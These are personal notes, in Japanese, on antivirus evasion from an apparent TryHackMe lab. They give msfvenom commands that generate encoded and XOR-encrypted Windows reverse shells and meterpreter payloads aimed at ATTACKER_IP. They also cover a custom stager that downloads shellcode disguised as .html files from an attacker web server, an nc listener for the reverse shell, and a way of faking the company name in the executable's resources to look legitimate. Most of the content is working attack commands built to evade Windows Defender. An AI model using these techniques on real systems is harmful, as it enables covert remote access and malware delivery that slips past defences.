## AVに検知される奴

### エンコード
エンコーダーの一覧
```
$ msfvenom --list encoders | grep excellent
```

ペイロードの作成
```
$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

### 暗号化
暗号一覧
```
$ msfvenom --list encrypt
```

ペイロードの作成
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

これらは単純過ぎて、Windows Defenderに検知される。

## AVに検知されない奴

ドキュメントにしたがい試してみたが、自分のPCのWindows11ではWindows Defenderに検知される。

- THMのwindows defenderの状況
```
PS C:\Users\thm> Get-MpComputerStatus | Select-Object -Property AMEngineVersion, AMProductVersion, AntispywareSignatureVersion

AMEngineVersion AMProductVersion AntispywareSignatureVersion
--------------- ---------------- ---------------------------
1.1.19500.2     4.18.2205.7      1.373.1336.0


PS C:\Users\thm> Get-MpComputerStatus | Select-Object -Property AntivirusSignatureLastUpdated

AntivirusSignatureLastUpdated
-----------------------------
9/1/2022 3:20:12 AM
```

- 自分のPC
```
PS C:\Users\hoge> Get-MpComputerStatus | Select-Object -Property AMEngineVersion, AMProductVersion, AntispywareSignatureVersion

AMEngineVersion AMProductVersion AntispywareSignatureVersion
--------------- ---------------- ---------------------------
1.1.24050.5     4.18.24050.7     1.413.487.0


PS C:\Users\hoge> Get-MpComputerStatus | Select-Object -Property AntivirusSignatureLastUpdated

AntivirusSignatureLastUpdated
-----------------------------
2024/06/24 13:51:20
```

## なので自分で作った検知されない奴

### 共通の下準備

#### ステージャーの作成

それぞれ、`mfsvenom`でペイロードを作成して、webサーバーに設置。共通のステージャー(hoge.cs)を使用する。
1. hoge.csを作成
2. Windows上でコンパイル
```
>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe hoge.cs
```
3. 出来上がった`hoge.exe`をやられ役のWindowsに配備

#### kaliでwebサーバーを起動
```
$ python -m http.server
```

### パターン1: 電卓起動(ステージャー型)

1. ペイロードの作成
```
$ msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o a.html -b '\x00\x0a\x0d'\n
```

2. やられ役のWindows上で、hoge.exeを実行
```
>hoge.exe
```

![image](https://github.com/yokohama/thm/assets/1023421/f99c50cc-3053-43c8-ace7-9f04628b1c11)



### パターン2: リバースシェル(ステージャー型)

1. ペイロードの作成
```
$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<Kali IP> LPORT=7474 -f raw -o b.html -b '\x00\x0a\x0d\'
```

2. やられ役のWindows上で、hoge.exeを実行(ペイロードURLをb.htmlに変更して)
```
>hoge.exe
```

3. Kaliで待ち受ける
```
$ nc -lvp 7474
```

![スクリーンショット 2024-06-25 131542](https://github.com/yokohama/thm/assets/1023421/4ba88b4f-dabe-42dd-b933-7238d0eb54d9)

### process explorerなどで見た時の会社名を加工する

1. RC(リソース・スクリプト(テキスト))_ファイルの作成

今回は会社名を加工したい。[こちら](https://github.com/yokohama/thm/blob/main/avevasionshellcode/task7/hoge.rc)を参照。

2. RCファイルをRES(リソース(バイナリ))ファイルに変換

RCファイルをリソースコンパイラ (rc.exe) を使用して .res ファイルに変換する。RESファイルは、バイナリ形式のリソースデータを含むファイルで、アプリケーションの実行ファイルに組み込むためのリソース情報を格納する。

3. RESファイルを使用してCSファイルをコンパイルし、EXEファイルを作成

C# コンパイラ (csc.exe) を使用して、.cs ファイルと .res ファイルから実行可能ファイル .exe を生成します。このステップでは、リソースファイルが実行ファイルに組み込まれ、最終的な製品に会社名やその他の情報を含めることができる。
